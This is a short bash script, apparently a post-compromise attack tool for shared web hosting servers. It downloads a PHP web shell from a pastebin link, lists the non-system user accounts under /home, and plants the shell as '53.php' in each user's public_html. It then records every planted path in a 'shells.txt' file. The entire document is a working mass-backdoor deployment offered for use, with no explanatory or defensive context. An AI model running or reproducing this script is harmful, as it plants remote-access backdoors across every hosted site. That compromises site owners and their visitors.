#!/bin/bash
#upload_Sehll_random
export ALLOW_PASSWORD_CHANGE=1
wget https://pastebin.com/raw/nrY6wbtu -O /root/shell.php
ls -la /home | awk '{print $3}' | grep -v root | grep -v wheel | grep -v cpanel | grep -v apache | grep -v csf | grep -v '^$' > /tmp/usersforup
for i in `more /tmp/usersforup `
do
                shell='53.php'
                cat /root/shell.php > /home/$i/public_html/$shell
                echo " [*] $i -> Done"
                echo "/home/$i/public_html/$shell" >> ~/shells.txt
done